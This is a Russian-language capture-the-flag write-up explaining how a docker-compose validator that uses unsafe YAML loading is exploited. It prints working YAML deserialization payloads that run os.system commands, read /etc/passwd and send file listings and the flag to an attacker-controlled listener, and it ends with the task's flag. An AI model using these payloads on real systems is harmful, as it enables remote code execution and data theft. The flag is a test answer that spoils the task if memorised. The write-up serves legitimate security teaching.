# #лидируйвалидируй: Write-up

Сервис принимает на вход файлы docker-compose и возвращает ответ: либо ошибок нет, либо есть хотя бы одна ошибка. Никаких уточнений о природе ошибки не делается.

Файлы docker-compose составляются на языке YAML, а сам по себе docker-compose написан на питоне, логично ожидать от валидатора того же. Ищем, какие с этим могут быть проблемы, выясняем, [например, тут](https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03), что YAML можно загружать небезопасным способом (через `yaml.load` вместо `yaml.safe_load`). Небезопасность способа в том, что YAML-файл можно придумать такой, что будет выполнен произвольный код. Например:

```
!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
```

На сервере отсутствует `mail`, да там вообще почти ничего нет. Поднимаем какой-нибудь сервер, который будет записывать приходящие POST-запросы, здесь он назван `post-listener.php`. Немного помучившись, можем сконструировать такой способ доставать информацию:

```
!!python/object/apply:os.system
    - python3 -c "import requests; requests.post('http://somewhere/post-listener.php', data='123')"
```

Попробуем понять, что есть на сервере:

```
!!python/object/apply:os.system
    - python3 -c "import requests, subprocess;
      requests.post('http://somewhere/post-listener.php',
      data=subprocess.run('find /',
                          shell=True, check=False,
                          stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT).stdout)"
```

Находим в конце списка папку `/app` с нашим приложением, а там — файл `旗.txt` (кстати, `旗` по-китайски и по-японски — флаг, вот совпадение, правда?). Отправляем себе результат выполнения `cat /app/旗.txt`, читаем флаг (как и полагается в иероглифическом письме, записанный по вертикали — по одной букве на строчку).

Флаг: **ugra_ule_ele_valilele_trali_vali_validate**
